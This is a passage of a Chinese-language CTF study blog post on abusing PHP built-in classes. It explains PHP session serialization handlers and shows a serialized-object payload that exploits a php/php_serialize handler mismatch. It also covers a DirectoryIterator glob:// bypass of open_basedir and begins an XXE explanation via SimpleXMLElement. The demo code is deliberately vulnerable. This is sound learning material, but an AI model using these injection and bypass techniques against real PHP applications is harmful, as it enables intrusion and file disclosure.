<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;AsaL1n&#x27;</span> ;</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">  <span class="variable">$session_id</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$session_id</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>序列化的结果是</p>
<p>session|s:6:”AsaL1n”;</p>
<p>前面是键名，后面是传参的值的序列化</p>
<h4 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];<span class="comment">//这里的长度是35</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//输出是#sessionsessionsessionsessionsessions:6:&quot;AsaL1n&quot;;</span></span><br><span class="line">   <span class="comment">// 显然是键名长度的ascll码对应的值，后半就是键名和键值序列化之后的结果</span></span><br></pre></td></tr></table></figure>

<h4 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h4><p>最后就是<code>session.serialize_handler</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;AsaL1n&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到将输入的值变成序列化的结果</p>
<h4 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h4><p>如果php和php_serialize两个处理器混合使用，就会产生问题</p>
<p>现在存在两个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里产生一个session，里面的值由get传入的那个值作为session的产生</p>
<p>然后存在另一个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">AsaL1n</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;emo&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;__wakeup&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">AsaL1n</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，上面生成session用的是php_serialize函数，但是下面解析的时候用的是php函数</p>
<p>这里存在问题</p>
<p>第一步里，假设我们输入的是</p>
<p>|O:6:”AsaL1n”:1:{s:4:”name”;s:5:”happy”;}</p>
<p>这里他生成的session文件是这样的</p>
<p>a:1:{s:7:”session”;s:44:”|O:6:”AsaL1n”:1:{s:4:”name”;s:5:”happy”;}”;}</p>
<p>但是php处理的时候，会把|前面的当作键值，后面的当作序列化的值，所以在解的时候</p>
<p>会把session的值进行一次反序列化，于是就造成了反序列化漏洞</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230920213038138.png" alt="image-20230920213038138"></p>
<p>正常情况下这里只会直接被销毁，不会出现wakeup方法</p>
<p>在[LCTF 2018]bestphp’s revenge那题里面，我们使用 call_user_func函数设置了两次的解析引擎</p>
<p>这样就完成了恶意数据的注入</p>
<h3 id="5-使用DirectoryIterator-类绕过-open-basedir"><a href="#5-使用DirectoryIterator-类绕过-open-basedir" class="headerlink" title="5.使用DirectoryIterator 类绕过 open_basedir"></a>5.使用DirectoryIterator 类绕过 open_basedir</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open_basedir函数</span><br><span class="line">open_basedir 将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。</span><br><span class="line">如果把flag添加到这个函数里面，那就不能直接使用flag函数</span><br></pre></td></tr></table></figure>

<p>DirectoryIterator 类提供了一个文件的接口，在php5里面增加的这个类</p>
<p>这个类可以使用golb:&#x2F;&#x2F;协议，无视open_basedir对目录的限制，可以起到ls的作用</p>
<p>代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230921154925627.png" alt="image-20230921154925627"></p>
<p>可以看到已经执行了根目录下的文件</p>
<p>也可以使用FilesystemIterator类</p>
<p>可以看到，也能输出</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230921155247215.png" alt="image-20230921155247215"></p>
<p>看到也可以输出</p>
<p>但是只能输出根目录和指定的目录文件，不能读取文件的内容</p>
<h3 id="6使用-SimpleXMLElement-类进行-XXE"><a href="#6使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="6使用 SimpleXMLElement 类进行 XXE"></a>6使用 SimpleXMLElement 类进行 XXE</h3><p>这个内置类可以解析xml文档里面的元素</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="variable">$data</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="variable">$options</span> = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="variable">$dataIsURL</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="variable">$namespaceOrPrefix</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="variable">$isPrefix</span> = <span class="literal">false</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span></span><br></pre></td></tr></table></figure>

<p>这里可以看到如果设置dataurl的为true的时候，就可以载入远程的xml数据</p>
<p>第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<p>第二的参数设置成2就可以了</p>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/29/nss2nd%E5%A4%8D%E7%8E%B0+wp/" title="NSSCTF 2nd复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">NSSCTF 2nd复现</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/21/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python  pickle反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">python  pickle反序列化</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AsaL1n</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/AsaL1n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">why we need that??</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">php原生类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-php%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">1.php原生类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8-Error-Exception-%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8C-XSS"><span class="toc-number">1.2.</span> <span class="toc-text">2.使用 Error&#x2F;Exception 内置类进行 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-error%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.error类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-exception%E7%B1%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.exception类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Error-Exception-%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.Error&#x2F;Exception 内置类绕过哈希比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Greatphp"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">[2020 极客大挑战]Greatphp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8-SoapClient-%E7%B1%BB%E8%BF%9B%E8%A1%8C-SSRF"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.使用 SoapClient 类进行 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LCTF-2018-bestphp%E2%80%99s-revenge"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">[LCTF 2018]bestphp’s revenge</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.5.</span> <span class="toc-text">php session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">php处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">php_binary处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">php_serialize 处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">问题原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8DirectoryIterator-%E7%B1%BB%E7%BB%95%E8%BF%87-open-basedir"><span class="toc-number">1.2.6.</span> <span class="toc-text">5.使用DirectoryIterator 类绕过 open_basedir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E4%BD%BF%E7%94%A8-SimpleXMLElement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-XXE"><span class="toc-number">1.2.7.</span> <span class="toc-text">6使用 SimpleXMLElement 类进行 XXE</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/11/java%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B01/" title="java java题目复现 1">java java题目复现 1</a><time datetime="2024-04-10T16:00:00.000Z" title="Created 2024-04-11 00:00:00">2024-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/01/php_mvc/" title="NKCTF2024 用过就是熟悉&amp;php_mvc学习">NKCTF2024 用过就是熟悉&amp;php_mvc学习</a><time datetime="2024-03-31T16:00:00.000Z" title="Created 2024-04-01 00:00:00">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/27/bypassjava/" title="cbctf bypass_java复现">cbctf bypass_java复现</a><time datetime="2024-03-26T16:00:00.000Z" title="Created 2024-03-27 00:00:00">2024-03-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/26/2024NKCTF/" title="2024NKCTF">2024NKCTF</a><time datetime="2024-03-25T16:00:00.000Z" title="Created 2024-03-26 00:00:00">2024-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/18/2024venomctf/" title="2024venomvtf wp+学习">2024venomvtf wp+学习</a><time datetime="2024-03-17T16:00:00.000Z" title="Created 2024-03-18 00:00:00">2024-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By AsaL1n</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>